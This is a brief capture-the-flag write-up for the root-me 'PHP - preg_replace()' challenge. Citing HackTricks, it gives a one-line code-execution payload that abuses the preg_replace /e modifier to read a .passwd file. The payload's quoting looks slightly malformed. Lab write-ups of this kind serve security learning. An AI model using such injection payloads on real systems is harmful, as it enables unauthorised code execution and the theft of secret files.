# PHP preg_replace

[root-me challenge PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace): Read `flag.php`.

----

Using [HackTricks Code execution using preg_replace()](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#code-execution-using-preg_replace):

```text
preg_replace("/a/e","file_get_contents(".passwd")","whatever")
```
